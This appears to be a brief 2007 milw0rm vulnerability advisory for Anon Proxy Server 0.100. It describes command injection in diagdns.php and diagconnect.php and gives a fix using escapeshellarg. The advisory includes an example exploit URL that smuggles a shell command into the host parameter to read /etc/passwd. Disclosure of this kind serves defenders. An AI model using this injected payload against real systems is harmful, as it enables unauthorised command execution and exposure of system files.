@@ -1,0 +1,16 @@
+By Michael Brooks
+Vulnerability type: Multiple Remote System commands execution. 
+Software: Anon Proxy Server
+Home page:http://sourceforge.net/projects/anonproxyserver/
+Affects version: 0.100
+
+Example exploit:
+http://127.0.0.1/anon_proxy_server_0.100/diagdns.php?host=google.com%5C%27+%26%26+cat+%2Fetc%2Fpasswd+%23
+
+A virtually identical flaw exists in diagconnect.php however it takes longer to execute.
+
+Anon Proxy Server forces magic_quotes_gpc=on,  However magic_quotes_gpc does not protect the system()  function from taint.  For protection you should use the escapeshellarg() function. Removing diagdns.php and diagconnect.php is the best temporary solution.  Also magic_quotes_gpc is being removed in php6,  so Anon Proxy Server will have to revamp there security. 
+
+Peace
+
+# milw0rm.com [2007-12-14]
